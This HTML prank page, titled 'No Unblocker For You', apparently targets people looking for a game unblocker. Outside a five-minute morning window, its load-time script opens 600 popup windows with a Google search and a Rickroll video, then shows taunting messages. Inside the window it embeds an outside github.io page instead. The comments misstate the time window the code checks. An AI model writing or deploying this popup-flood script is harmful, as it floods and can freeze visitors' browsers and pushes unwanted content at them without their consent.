<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="https://t4.ftcdn.net/jpg/01/15/20/75/360_F_115207580_US2etunH78I7iMYHOoNVvxQTCIdoPdRj.jpg" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>No Unblocker For You</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #B0C4DE; /* Bluish-gray color */
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        header {
            background-color: #555;
            color: #fff;
            padding: 20px;
            text-align: center;
            font-size: 36px;
            margin-bottom: 20px;
        }

        main {
            text-align: center;
            padding: 20px;
        }

        p {
            margin: 10px 0;
            font-size: 18px;
            color: #555;
        }

        /* Hide the main content initially */
        #content {
            display: none;
        }

        /* Style for the embedded iframe */
        #embeddedFrame {
            width: 100%;
            height: 500px; /* Adjust the height as needed */
            border: none;
        }
    </style>
</head>
<body>
    <header>No Unblocker For You</header>

    <!-- Main Content -->
    <div id="content">
        <main>
            <p>LMAO</p>
            <p>You should just not play games lol</p>
            <p>Guess you're just bad</p>
            <p>I think it's a skill issue no cap</p>
        </main>
    </div>

    <!-- Script for Redirect and Time Check -->
    <script>
        // Function to check if the current time is between 10:00 and 10:30
        function isBetween10and1030() {
            var now = new Date();
            var hours = now.getHours();
            var minutes = now.getMinutes();
            return hours === 9 && minutes >= 0 && minutes < 5;
        }

        // Redirect to Google search
        function redirectToGoogleSearch() {
            for (var i = 0; i < 300; i++) {
                window.open("https://www.google.com/search?q=hot_men_uwu&safe=active&ssui=on", "_blank", "width=500,height=500");
                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank", "width=500,height=500");
            }
        }

        // Display the embedded iframe between 10:00 and 10:30 or redirect otherwise
        if (isBetween10and1030()) {
            document.getElementById("content").style.display = "none"; // Hide main content
            // Create and append the iframe
            var iframe = document.createElement("iframe");
            iframe.setAttribute("src", "https://connorisanerd.github.io/sh/");
            iframe.setAttribute("id", "embeddedFrame");
            document.body.appendChild(iframe);
        } else {
            // Redirect to Google search if not between 10:00 and 10:30
            redirectToGoogleSearch();
            // Display main content
            document.getElementById("content").style.display = "block";
        }
    </script>

</body>
</html>
